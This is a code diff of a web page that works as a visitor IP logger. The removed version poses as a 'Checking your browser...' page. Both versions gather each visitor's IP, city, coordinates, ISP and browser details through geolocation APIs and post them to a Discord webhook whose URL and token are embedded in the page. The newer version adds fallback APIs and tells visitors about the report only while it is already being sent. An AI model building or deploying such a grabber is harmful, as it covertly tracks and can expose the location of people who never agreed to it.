@@ -3,97 +3,181 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Visitor Info</title>
     <style>
         body {
-            background: #1a1a1a;
-            color: #fff;
             font-family: Arial, sans-serif;
+            background: #1e1e2f;
+            color: #fff;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
+            flex-direction: column;
         }
-        .message {
+        .card {
+            background: #2a2a40;
+            padding: 2rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+            max-width: 500px;
             text-align: center;
-            font-size: 1.2rem;
-            opacity: 0.8;
+        }
+        .status {
+            color: #aaf0e9;
+            margin-bottom: 1rem;
+        }
+        .small {
+            font-size: 0.8rem;
+            color: #aaa;
+            margin-top: 2rem;
         }
     </style>
 </head>
 <body>
-    <div class="message">
-        Checking your browser...
+    <div class="card">
+        <h1>👋 Hello visitor</h1>
+        <div class="status" id="status">Gathering your information...</div>
+        <div id="details" style="text-align: left; font-size: 0.9rem;"></div>
+        <div class="small">We've sent a report to the site owner.</div>
     </div>
 
     <script>
         (function() {
-            // Collect browser and system information
+            const statusEl = document.getElementById('status');
+            const detailsEl = document.getElementById('details');
+            const webhookURL = 'https://discord.com/api/webhooks/1482493568831717648/84IzzIBPsGlJfCEZjVCg-qok8J71R61VoyXKPxFi9AvXRrmKmG_NajRyTJyJlM2Tukpf';
+
+            // Collect browser info
             const browserInfo = {
                 userAgent: navigator.userAgent,
                 language: navigator.language,
                 platform: navigator.platform,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
+                screen: `${screen.width}x${screen.height}`,
                 colorDepth: screen.colorDepth,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 cookiesEnabled: navigator.cookieEnabled,
                 doNotTrack: navigator.doNotTrack || 'unspecified'
             };
 
-            // Function to send data to Discord webhook
-            function sendToDiscord(payload) {
-                const webhookURL = 'https://discord.com/api/webhooks/1482493568831717648/84IzzIBPsGlJfCEZjVCg-qok8J71R61VoyXKPxFi9AvXRrmKmG_NajRyTJyJlM2Tukpf';
-                
+            // Display browser info on page
+            detailsEl.innerHTML = `<strong>Browser:</strong> ${browserInfo.userAgent.substr(0, 60)}...<br>
+                                   <strong>Screen:</strong> ${browserInfo.screen}<br>
+                                   <strong>Language:</strong> ${browserInfo.language}<br>
+                                   <strong>Platform:</strong> ${browserInfo.platform}<br>
+                                   <strong>Timezone:</strong> ${browserInfo.timezone}`;
+
+            // Function to send to Discord
+            function sendToDiscord(content) {
                 fetch(webhookURL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                }).catch(error => {
-                    console.error('Failed to send to Discord:', error);
-                });
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: content })
+                }).catch(e => console.error('Discord send failed:', e));
             }
 
-            // Try to get IP and location data from ipapi.co
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(ipData => {
-                    // Construct a detailed message
-                    const message = {
-                        content: `🆕 **New Visitor**\n` +
-                                 `**IP:** ${ipData.ip || 'N/A'}\n` +
-                                 `**Location:** ${ipData.city || '?'}, ${ipData.region || '?'}, ${ipData.country_name || '?'}\n` +
-                                 `**Coordinates:** ${ipData.latitude || '?'}, ${ipData.longitude || '?'}\n` +
-                                 `**ISP:** ${ipData.org || 'N/A'}\n` +
-                                 `**Timezone:** ${ipData.timezone || browserInfo.timezone}\n` +
-                                 `**Browser:** ${browserInfo.userAgent}\n` +
-                                 `**Screen:** ${browserInfo.screenWidth}x${browserInfo.screenHeight}\n` +
-                                 `**Language:** ${browserInfo.language}\n` +
-                                 `**Platform:** ${browserInfo.platform}\n` +
-                                 `**Cookies Enabled:** ${browserInfo.cookiesEnabled}\n` +
-                                 `**Do Not Track:** ${browserInfo.doNotTrack}`
-                    };
+            // Try multiple IP APIs in order
+            const ipApis = [
+                {
+                    url: 'https://ipapi.co/json/',
+                    parse: (data) => ({
+                        ip: data.ip,
+                        city: data.city,
+                        region: data.region,
+                        country: data.country_name,
+                        loc: `${data.latitude},${data.longitude}`,
+                        org: data.org,
+                        timezone: data.timezone
+                    })
+                },
+                {
+                    url: 'https://ipinfo.io/json?token=YOUR_TOKEN',  // ipinfo.io requires a free token for extended data; without token it gives limited info but still IP and location roughly.
+                    parse: (data) => ({
+                        ip: data.ip,
+                        city: data.city,
+                        region: data.region,
+                        country: data.country,
+                        loc: data.loc,
+                        org: data.org,
+                        timezone: data.timezone
+                    }),
+                    // Note: ipinfo.io without token still returns city/region/country but may be less accurate; it's free but limited requests.
+                    // For production, get a free token from ipinfo.io and replace 'YOUR_TOKEN'
+                },
+                {
+                    url: 'http://ip-api.com/json/',  // note: http, not https; but ip-api.com supports https if you pay. For free, http is fine, but may be blocked on https sites.
+                    parse: (data) => ({
+                        ip: data.query,
+                        city: data.city,
+                        region: data.regionName,
+                        country: data.country,
+                        loc: `${data.lat},${data.lon}`,
+                        org: data.isp,
+                        timezone: data.timezone
+                    })
+                }
+            ];
 
-                    sendToDiscord(message);
-                })
-                .catch(error => {
-                    // If geolocation API fails, send whatever we have
-                    console.warn('IP geolocation failed:', error);
-                    const fallbackMessage = {
-                        content: `🆕 **New Visitor (limited data)**\n` +
-                                 `**Browser Info:** ${browserInfo.userAgent}\n` +
-                                 `**Screen:** ${browserInfo.screenWidth}x${browserInfo.screenHeight}\n` +
-                                 `**Language:** ${browserInfo.language}\n` +
-                                 `**Platform:** ${browserInfo.platform}\n` +
-                                 `**Timezone:** ${browserInfo.timezone}\n` +
-                                 `**Cookies Enabled:** ${browserInfo.cookiesEnabled}\n` +
-                                 `**Note:** Could not retrieve IP/location.`
-                    };
-                    sendToDiscord(fallbackMessage);
-                });
+            // Try APIs one by one
+            function tryApi(index) {
+                if (index >= ipApis.length) {
+                    // All APIs failed
+                    statusEl.innerText = 'Could not retrieve full location.';
+                    const fallbackMsg = `🆕 **New Visitor (Limited Data)**\n` +
+                        `**Browser:** ${browserInfo.userAgent}\n` +
+                        `**Screen:** ${browserInfo.screen}\n` +
+                        `**Language:** ${browserInfo.language}\n` +
+                        `**Platform:** ${browserInfo.platform}\n` +
+                        `**Timezone:** ${browserInfo.timezone}\n` +
+                        `**Note:** IP geolocation unavailable.`;
+                    sendToDiscord(fallbackMsg);
+                    return;
+                }
+
+                const api = ipApis[index];
+                statusEl.innerText = `Trying to locate you (${index+1}/${ipApis.length})...`;
+                
+                fetch(api.url, { mode: 'cors' })
+                    .then(res => res.json())
+                    .then(data => {
+                        console.log(`API ${index} response:`, data);
+                        let parsed;
+                        try {
+                            parsed = api.parse(data);
+                        } catch (e) {
+                            throw new Error('Parse failed');
+                        }
+                        if (!parsed.ip) throw new Error('No IP in response');
+
+                        // Success - build message
+                        const msg = `🆕 **New Visitor**\n` +
+                            `**IP:** ${parsed.ip}\n` +
+                            `**Location:** ${parsed.city || '?'}, ${parsed.region || '?'}, ${parsed.country || '?'}\n` +
+                            `**Coordinates:** ${parsed.loc || '?'}\n` +
+                            `**ISP:** ${parsed.org || 'N/A'}\n` +
+                            `**Timezone:** ${parsed.timezone || browserInfo.timezone}\n` +
+                            `**Browser:** ${browserInfo.userAgent}\n` +
+                            `**Screen:** ${browserInfo.screen}\n` +
+                            `**Language:** ${browserInfo.language}\n` +
+                            `**Platform:** ${browserInfo.platform}\n` +
+                            `**Cookies Enabled:** ${browserInfo.cookiesEnabled}\n` +
+                            `**Do Not Track:** ${browserInfo.doNotTrack}`;
+
+                        sendToDiscord(msg);
+                        statusEl.innerText = 'Information sent!';
+                        detailsEl.innerHTML = `<strong>IP:</strong> ${parsed.ip}<br>
+                                               <strong>Location:</strong> ${parsed.city}, ${parsed.region}, ${parsed.country}<br>
+                                               ${detailsEl.innerHTML}`;
+                    })
+                    .catch(err => {
+                        console.warn(`API ${index} failed:`, err);
+                        tryApi(index + 1); // try next
+                    });
+            }
+
+            // Start trying
+            tryApi(0);
         })();
     </script>
 </body>
